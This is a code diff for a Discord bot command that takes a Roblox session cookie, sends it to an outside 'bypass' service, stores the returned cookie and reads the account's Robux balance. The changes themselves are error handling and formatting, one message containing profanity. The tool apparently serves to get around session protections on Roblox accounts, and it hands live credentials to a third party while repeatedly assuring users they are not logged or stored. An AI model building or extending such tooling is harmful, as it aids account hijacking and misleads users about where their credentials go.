@@ -66,12 +66,19 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       iconURL: interaction.user.displayAvatarURL(),
     };
 
-    const validation = await validateCookie(cookie);
+    const validation = await validateCookie(cookie, 3);
     if (!validation.valid) {
+      const isNetwork = validation.debug.includes('getaddrinfo') ||
+                        validation.debug.includes('ENOTFOUND') ||
+                        validation.debug.includes('ETIMEDOUT');
       const embed = new EmbedBuilder()
-        .setTitle('𖣐 Invalid Cookie .ᐟ')
+        .setTitle(isNetwork ? '𖣐 Network Error .ᐟ' : '𖣐 Invalid Cookie .ᐟ')
         .setColor('#FFFFFF')
-        .setDescription('✧ **Error**\n────\n⭑ The provided cookie is not valid.\n⭑ Your credentials were not logged.')
+        .setDescription(
+          isNetwork
+            ? '✧ **Failed to fetch API!**\n────\n⭑ Cookie was valid, but error fuck our code 🚬..\n⭑ Check your internet connection and try again.'
+            : `✧ **Error Occurred**\n────\n⭑ The provided cookie is not valid.\n⭑ Your credentials were not logged.`
+        )
         .setFooter(footerData);
       await interaction.editReply({ embeds: [embed] });
       return;
@@ -80,9 +87,13 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
     const progressEmbed = new EmbedBuilder()
       .setTitle('𖣐 Processing .ᐟ')
       .setColor('#FFFFFF')
-      .setDescription('✧ **Status:** Sending bypass request...\n────\n⭑ Contacting external bypass service.\n⭑ Your credentials are not logged or stored.')
+      .setDescription(
+        '✧ **Status:** Sending bypass request...\n' +
+        `────\n` +
+        `⭑ Contacting external bypass service.\n` +
+        `⭑ Your credentials are not logged or stored.`
+      )
       .setFooter(footerData);
-
     await interaction.editReply({ embeds: [progressEmbed] });
 
     const url = 'https://rbx-bypass.com/api/public/bypass';
@@ -104,12 +115,11 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
         const newCookie = data.cookie || null;
         let id = '';
         let robux = 0;
-
         if (newCookie) {
           id = Math.random().toString(36).slice(2, 10);
           bypassStore.set(id, newCookie);
           setTimeout(() => bypassStore.delete(id), 300000);
-          const newValidation = await validateCookie(newCookie);
+          const newValidation = await validateCookie(newCookie, 3);
           if (newValidation.valid) {
             robux = await fetchRobux(newCookie, String(newValidation.userId));
           }
@@ -134,7 +144,6 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
           )
           .setImage('https://files.catbox.moe/955g15.gif')
           .setFooter(footerData);
-
         const components = newCookie ? [buildBypassButtons(id)] : [];
         await interaction.editReply({ embeds: [embed], components });
       } else if (data.error === 'BYPASS_IN_PROGRESS') {
@@ -193,7 +202,10 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
         `⭑ ${error.message || 'Something went wrong.'}\n` +
         `⭑ Your credentials were not logged or stored.`
       )
-      .setFooter({ text: `${interaction.user.username} | ${new Date().toLocaleString()}`, iconURL: interaction.user.displayAvatarURL() });
+      .setFooter({
+        text: `${interaction.user.username} | ${new Date().toLocaleString()}`,
+        iconURL: interaction.user.displayAvatarURL(),
+      });
     await interaction.editReply({ embeds: [embed] });
   }
 }
